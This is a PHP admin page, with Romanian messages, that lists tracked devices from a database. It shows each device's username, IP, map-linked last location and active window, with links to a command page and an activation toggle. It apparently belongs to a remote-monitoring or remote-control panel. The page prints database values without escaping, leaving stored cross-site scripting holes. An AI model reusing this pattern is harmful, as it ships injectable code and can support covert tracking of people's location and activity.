<?php include 'header.php'; ?>



<?php

if ($conn->connect_error)

{

	echo 'Eroare in conectarea la baza de date';

} else {



	

			

			

			

			$sql = "SELECT * FROM devices ORDER BY id ASC";

			$result = $conn->query($sql);



			if ($result->num_rows > 0) 

			{

			echo '

	<table class="table table-condensed">

    <thead>

      <tr>

        <th>id</th>

		<th>Type</th>

        <th>Name</th>

		<th>Username</th>

        <th>Active</th>

		<th>IP</th>

		<th>LastLocation</th>

		<th>ActiveWindow</th>

		<th>LastSeen</th>

		<th>More</th>

		<th>Activator</th>

	

      </tr>

    </thead>

    <tbody>';

				// output data of each row

				while($row = $result->fetch_assoc()) {

					$active = "No";

					$activity = "Activate";

					if($row["active"] == "1")

					{

						$active = "Yes";

						$activity = "Deactivate";

					}

					echo '<tr><td>'.$row["id"].'</td><td>'.$row["type"].'</td><td>'.$row["name"].'</td><td>'.$row["username"].'</td><td>'.$active.'</td><td>'.$row["ip"].'</td><td><a href="http://www.google.com/maps/place/'.$row["lastlocation"].'/@'.$row["lastlocation"].',17z">'.$row["lastlocation"].'</a></td><td>'.$row["activewindow"].'</td><td>'.$row["lastseen"].'</td><td><a href="cmd.php?id='.$row["id"].'&type='.$row["type"].'">Select</a></td><td><a href="devicesetactive.php?t1='.$row["id"].'&t2='.$row["active"].'">'.$activity.'</td></a></tr>';

				

				

				}

			echo ' </tbody>

  </table>';

			}

			else {

				echo "<h2>Fara rezultate</h2>";

			}

			$conn->close();

			

		

			

		



		}

		

?>